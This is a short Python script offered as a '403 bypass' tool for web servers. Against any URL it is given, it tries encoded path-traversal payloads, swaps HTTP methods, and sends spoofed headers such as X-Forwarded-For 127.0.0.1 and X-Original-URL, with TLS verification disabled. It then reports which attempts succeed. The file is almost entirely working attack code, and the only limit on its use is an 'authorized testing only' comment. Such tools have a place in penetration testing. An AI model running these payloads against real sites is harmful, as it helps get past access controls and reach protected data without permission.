#!/usr/bin/env python3
# ----------------------------------------
# 403 Bypass Testing Tool
# Author: Rajpal
# Purpose: Authorized security testing only
# ----------------------------------------

import requests
import sys

requests.packages.urllib3.disable_warnings()

TIMEOUT = 10

PATH_PAYLOADS = [
    "/", "/.", "/..;/", "/%2e/", "/%2f/", "/;/", "/./",
    "/*", "/%09", "/%20", "/%00", "/%0a", "/%0d",
    "/..%2f", "/.%2e/", "/..%00/", "/%2e%2e%2f",
]

METHODS = ["GET", "POST", "HEAD", "OPTIONS"]

HEADER_PAYLOADS = [
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
]

def banner():
    print("=" * 50)
    print("403 Bypass Testing Tool")
    print("Author: Rajpal")
    print("=" * 50)

def test_paths(base_url):
    print("\n[+] Path-based bypass tests")
    for payload in PATH_PAYLOADS:
        url = base_url.rstrip("/") + payload
        try:
            r = requests.get(url, verify=False, timeout=TIMEOUT)
            print(f"[PATH] {r.status_code} | {len(r.text)} | {url}")
        except Exception as e:
            print(f"[ERROR] {url} -> {e}")

def test_methods(base_url):
    print("\n[+] HTTP Method tests")
    for method in METHODS:
        try:
            r = requests.request(method, base_url, verify=False, timeout=TIMEOUT)
            print(f"[METHOD] {method} -> {r.status_code} | {len(r.text)}")
        except Exception as e:
            print(f"[ERROR] {method} -> {e}")

def test_headers(base_url):
    print("\n[+] Header-based bypass tests")
    for header in HEADER_PAYLOADS:
        try:
            r = requests.get(base_url, headers=header, verify=False, timeout=TIMEOUT)
            print(f"[HEADER] {header} -> {r.status_code} | {len(r.text)}")
        except Exception as e:
            print(f"[ERROR] {header} -> {e}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 403_bypass_rajpal.py https://target.com/protected")
        sys.exit(1)

    base_url = sys.argv[1]
    banner()
    test_paths(base_url)
    test_methods(base_url)
    test_headers(base_url)

if __name__ == "__main__":
    main()
